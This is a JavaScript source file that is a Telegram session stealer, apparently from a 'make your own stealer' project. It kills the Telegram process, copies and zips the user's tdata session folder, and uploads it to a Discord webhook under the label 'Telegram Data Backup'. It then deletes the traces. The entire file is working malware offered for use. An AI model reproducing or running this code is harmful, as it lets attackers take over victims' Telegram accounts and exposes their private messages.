// telegram.mjs or add "type": "module" to package.json and keep it as telegram.js

import fs from 'fs-extra';
import archiver from 'archiver';
import fetch from 'node-fetch';
import findProcess from 'find-process';
import path from 'path';
import { homedir } from 'os';
import FormData from 'form-data';

const userHome = homedir();
const hookUrl = "https://discord.com/api/webhooks/";

async function killProcess(processName) {
    try {
        const processes = await findProcess('name', processName);
        processes.forEach(proc => {
            process.kill(proc.pid, 'SIGKILL');
            console.log(`Process ${processName} with PID ${proc.pid} has been killed successfully.`);
        });
    } catch (error) {
        console.error(`Failed to kill process ${processName}: ${error}`);
    }
}

async function copyDirectory(src, dst) {
    await fs.copy(src, dst);
}

async function removeDirectory(dirPath) {
    await fs.remove(dirPath);
}

async function telegram() {
    console.log("Attempting to kill Telegram process...");
    await killProcess("Telegram.exe");

    const sourcePath = path.join(userHome, "AppData\\Roaming\\Telegram Desktop\\tdata");
    const tempPath = path.join(userHome, "AppData\\Local\\Temp\\tdata_session");
    const zipPath = path.join(userHome, "AppData\\Local\\Temp", "tdata_session.zip");

    console.log("Checking if source path exists...");
    if (await fs.pathExists(sourcePath)) {
        console.log("Source path exists. Checking if temp path needs to be removed...");
        if (await fs.pathExists(tempPath)) {
            console.log("Temp path exists. Removing...");
            await removeDirectory(tempPath);
        }
        console.log("Copying data from source to temp...");
        await copyDirectory(sourcePath, tempPath);

        console.log("Creating ZIP archive...");
        try {
            const output = fs.createWriteStream(zipPath);
            const archive = archiver('zip', { zlib: { level: 9 } });
            archive.on('error', err => { throw err; }); 
            archive.pipe(output);
            archive.directory(tempPath, false);
            await archive.finalize();
            console.log("ZIP archive created.");
        } catch (err) {
            console.error("Failed to create ZIP archive:", err);
            return;
        }

        console.log("Preparing data for Discord webhook...");
        const data = new FormData();
        data.append('file', fs.createReadStream(zipPath), 'tdata_session.zip');
        data.append('payload_json', JSON.stringify({
            embeds: [{
                title: "Telegram Data Backup",
                description: "Latest backup of the Telegram session data.",
                color: 242424,
                author: {
                    name: "Follow on GitHub",
                    icon_url: "https://i.imgur.com/NYWdLg6.png"
                },
                footer: {
                    text: "github.com/lawxsz/make-u-own-stealer"
                }
            }]
        }));

        console.log("Sending data to Discord...");
        const response = await fetch(hookUrl, {
            method: 'POST',
            body: data,
            headers: data.getHeaders()
        });

        if (response.ok) {
            console.log('Telegram data sent to Discord webhook.');
        } else {
            console.error('Error sending Telegram data:', response.statusText);
        }

        console.log("Cleaning up...");
        await fs.remove(zipPath);
        await removeDirectory(tempPath);
        console.log("Cleanup completed.");
    } else {
        console.log("Source path does not exist.");
    }
}

telegram();
